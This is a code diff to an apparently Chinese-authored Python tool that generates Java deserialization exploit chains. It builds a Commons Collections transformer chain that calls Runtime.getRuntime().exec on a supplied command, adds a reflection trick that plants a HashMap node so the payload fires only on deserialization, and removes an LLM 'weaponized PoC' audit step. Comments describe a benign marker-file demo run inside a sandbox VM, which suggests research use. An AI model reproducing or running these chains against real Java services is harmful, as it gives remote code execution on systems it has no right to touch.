@@ -15,6 +15,7 @@
 from __future__ import annotations
 
 import json
+import os
 import subprocess
 import sys
 import time
@@ -22,7 +23,7 @@ import zipfile
 from pathlib import Path
 
 from jgd import PROJECT_ROOT
-from jgd.infra import llm, matrix_agent as ma, scope
+from jgd.infra import matrix_agent as ma, scope
 
 HERE = PROJECT_ROOT
 
@@ -31,7 +32,8 @@ ECJ = Path.home() / "cfx/tools/ecj.jar"
 POC_DIR = scope.scoped_dir(HERE / "pocs")
 CP = f"{DYN}:{ma.corpus_dir()}/*:{ma.CLASSIC}/*:{ma.TOP50}/*"
 JAVA_OPTS = ["-Xmx256m", "--add-opens", "java.base/sun.reflect=ALL-UNNAMED",
-             "--add-opens", "java.management/javax.management=ALL-UNNAMED"]
+             "--add-opens", "java.management/javax.management=ALL-UNNAMED",
+             "--add-opens", "java.base/java.util=ALL-UNNAMED"]
 JDK17_OPENS = [
     "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
     "--add-exports", "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
@@ -133,18 +135,28 @@ public class PT{n} {{
         Class<?> ct = Class.forName(
             "org.apache.commons.collections.functors.ConstantTransformer");
         Object t1 = it.getConstructor(String.class, Class[].class, Object[].class)
-            .newInstance("getRuntime", null, null);
+            .newInstance("getMethod",
+                         new Class[]{{ String.class, Class[].class }},
+                         new Object[]{{ "getRuntime", new Class[0] }});
         Object t2 = it.getConstructor(String.class, Class[].class, Object[].class)
+            .newInstance("invoke",
+                         new Class[]{{ Object.class, Object[].class }},
+                         new Object[]{{ null, new Object[0] }});
+        Object t3 = it.getConstructor(String.class, Class[].class, Object[].class)
             .newInstance("exec", new Class[]{{ String.class }},
                          new Object[]{{ cmd }});
         Object c0 = ct.getConstructor(Object.class)
             .newInstance(Runtime.class);
-        java.io.Serializable[] arr = new java.io.Serializable[] {{
-            (java.io.Serializable) c0, (java.io.Serializable) t1,
-            (java.io.Serializable) t2 }};
+        Class<?> tf = Class.forName(
+            "org.apache.commons.collections.Transformer");
+        Object arr = java.lang.reflect.Array.newInstance(tf, 4);
+        java.lang.reflect.Array.set(arr, 0, c0);
+        java.lang.reflect.Array.set(arr, 1, t1);
+        java.lang.reflect.Array.set(arr, 2, t2);
+        java.lang.reflect.Array.set(arr, 3, t3);
         Object chain = Class.forName(
             "org.apache.commons.collections.functors.ChainedTransformer")
-            .getConstructor(new Class[]{{ java.io.Serializable[].class }})
+            .getConstructor(arr.getClass())
             .newInstance(new Object[]{{ arr }});
         Map lazy = (Map) Class.forName(
             "org.apache.commons.collections.map.LazyMap")
@@ -226,6 +238,13 @@ public class PT{n} {{
                 m.put(b2, "v2");
             }} catch (Throwable ig) {{}}
             root = m;
+        }} else if (mode.startsWith("hmz:")) {{
+            // 零触发 HashMap: 反射写入 table, 构建/序列化不调用 key.hashCode;
+            // 反序列化 readObject→putVal→hash(key) 才触发, 用于证明 deser 闭链。
+            Object b = make_bridge(mode.substring(4), tail, mapKey, mapIface);
+            java.util.HashMap<Object, Object> m = new java.util.HashMap<>();
+            put_no_hash(m, b, "v");
+            root = m;
         }} else {{
             Object b = make_bridge(mode.substring(3), tail, mapKey, mapIface);
             java.util.HashMap<Object, Object> m = new java.util.HashMap<>();
@@ -237,6 +256,27 @@ public class PT{n} {{
             oos.writeObject(root);
         }}
         System.out.println("BUILD_OK");
+    }}
+    static void put_no_hash(java.util.HashMap<Object, Object> m,
+            Object k, Object v) throws Exception {{
+        Class<?> nc = Class.forName("java.util.HashMap$Node");
+        java.lang.reflect.Constructor<?> ctor = nc.getDeclaredConstructor(
+            int.class, Object.class, Object.class, nc);
+        ctor.setAccessible(true);
+        Object node = ctor.newInstance(0, k, v, null);
+        java.lang.reflect.Field tf =
+            java.util.HashMap.class.getDeclaredField("table");
+        tf.setAccessible(true);
+        Object table = tf.get(m);
+        if (table == null) {{
+            table = java.lang.reflect.Array.newInstance(nc, 16);
+            tf.set(m, table);
+        }}
+        java.lang.reflect.Array.set(table, 0, node);
+        java.lang.reflect.Field sf =
+            java.util.HashMap.class.getDeclaredField("size");
+        sf.setAccessible(true);
+        sf.setInt(m, 1);
     }}
     static Object make_bridge(String cls, Object tail,
             String mapKey, String mapIface) throws Exception {{
@@ -437,7 +477,7 @@ def tail_jars(mode: str, bridge: str) -> str:
             sj = str(j)
             if sj not in uniq:
                 uniq.append(sj)
-    return ":".join(uniq)
+    return os.pathsep.join(uniq)
 
 
 def _attempt(chain_id: str, mode: str, bridge: str, jdk11: bool,
@@ -687,16 +727,70 @@ def jep290_profile(chain_classes: list[str]) -> dict:
         "note": "基于常见 filter 配置画像; 真实目标以其 ObjectInputFilter 为准"}
 
 
-def ds_verify(results: list[dict]) -> dict:
-    prompt = (
-        "你是武器化 PoC 验收审计员。以下为本地良性演示(仅写标记文件)的构建与"
-        "触发结果。请审计: 1) 链组装是否语义正确 2) fired 证据是否构成 RCE 闭环"
-        "演示 3) 利用条件陈述是否准确。输出 JSON: {\"accepted\": true/false, "
-        "\"notes\": \"...\"}\n\n"
-        + json.dumps(results, ensure_ascii=False, indent=1))
-    resp = llm.ask("ds", "你是严谨的利用可行性审计员。", prompt,
-                   temperature=0.1, max_tokens=700)
-    return llm.extract_json(resp.get("content") or "") or {"parse_fail": True}
+def run_chain(target: str | Path, bridge: str, *, trigger: str = "hash",
+              tail: str | None = None, jdk11: bool = False,
+              out: str | Path | None = None,
+              ecj: str | Path | None = None) -> dict:
+    """Build and verify one bridge chain in an explicit output directory.
+
+    This is the deterministic entry point used by ``jgd poc``.  It does not
+    decide whether execution is safe; callers must run it inside the selected
+    sandbox (the Linux VM is the current boundary).
+    """
+    import os
+
+    global DYN, ECJ, POC_DIR, CP, MARKER
+    target = Path(target).resolve()
+    if not target.is_dir():
+        raise FileNotFoundError(f"target directory not found: {target}")
+    if trigger not in {"hash", "hash-build", "equals", "tostring"}:
+        raise ValueError(f"unsupported trigger: {trigger}")
+    out = Path(out).resolve() if out else (Path.cwd() / "runs" / f"poc-{int(time.time())}")
+    dyn = out / "dyn"
+    pocs = out / "pocs"
+    dyn.mkdir(parents=True, exist_ok=True)
+    pocs.mkdir(parents=True, exist_ok=True)
+    os.environ["JGD_TARGET"] = str(target)
+    DYN = dyn
+    POC_DIR = pocs
+    ECJ = Path(ecj).resolve() if ecj else ECJ
+    if not ECJ.exists():
+        raise FileNotFoundError(
+            f"ECJ compiler jar not found: {ECJ}; pass --ecj or install ecj.jar")
+    CP = f"{dyn}{os.pathsep}{target}/*"
+    MARKER = str(out / "marker")
+    tails = {t["lib"] for t in select_tail(target) if t["present"]}
+    if tail:
+        tails = {tail}
+    prefix = {
+        "hash": "hmz:",
+        "hash-build": "hm:",
+        "equals": "heq:",
+        "tostring": "bave:",
+    }[trigger]
+    result = build_and_verify(
+        f"{trigger}-{bridge.replace('.', '-')}-{tail or 'auto'}",
+        prefix + bridge,
+        bridge,
+        jdk11,
+        tails,
+    )
+    result.update({
+        "target": str(target),
+        "trigger": trigger,
+        "tail_candidates": sorted(tails),
+        "out": str(out),
+        "marker": MARKER,
+        "jep290": jep290_profile(
+            [bridge.replace(".", "/"), "com/sun/syndication/feed/impl/ObjectBean",
+             "javax/xml/transform/Templates"]
+        ),
+    })
+    (out / "poc_result.json").write_text(
+        json.dumps(result, ensure_ascii=False, indent=2),
+        encoding="utf-8",
+    )
+    return result
 
 
 def main() -> int:
@@ -721,14 +815,14 @@ def main() -> int:
         print("[poc] 当前语料无任何已挖掘/兜底链的桥类在场 — PoC 阶段跳过")
         POC_DIR.mkdir(parents=True, exist_ok=True)
         (POC_DIR / "poc_results.json").write_text(json.dumps(
-            {"results": [], "acceptance": "SKIPPED_NO_BRIDGE_IN_TARGET",
+            {"results": [], "status": "SKIPPED_NO_BRIDGE_IN_TARGET",
              "corpus": str(corpus)}, ensure_ascii=False, indent=1),
             encoding="utf-8")
         (POC_DIR / "README.md").write_text(
             "# JGD PoC 产物\n\n当前目标语料中没有任何已挖掘链或兜底链的"
             "桥类在场, PoC 生成不适用(桥不在场则链不可组装)。\n"
             f"目标语料: `{corpus}`\n", encoding="utf-8")
-        print("[poc] dsh 验收: skipped (语料内无可用桥)")
+        print("[poc] skipped (no usable bridge in target)")
         return 0
     # 链间并行 — JVM 冷启动等待是 90% wall, 串行浪费
     _present = {t["lib"] for t in tails if t["present"]}
@@ -770,12 +864,11 @@ def main() -> int:
     POC_DIR.mkdir(parents=True, exist_ok=True)
     (POC_DIR / "README.md").write_text("\n".join(lines), encoding="utf-8")
 
-    acc = ds_verify(results)
     (POC_DIR / "poc_results.json").write_text(
-        json.dumps({"results": results, "ds": acc, "ts":
-                    time.strftime("%FT%T")}, ensure_ascii=False, indent=1),
+        json.dumps({"results": results, "ts": time.strftime("%FT%T")},
+                   ensure_ascii=False, indent=1),
         encoding="utf-8")
-    print(f"\ndsh 验收: accepted={acc.get('accepted')}")
+    print("\nLLM gatekeeping: removed (deterministic PoC status owns the result)")
     for r in results:
         print(f"  {r['chain']}: {r.get('status')}")
     return 0
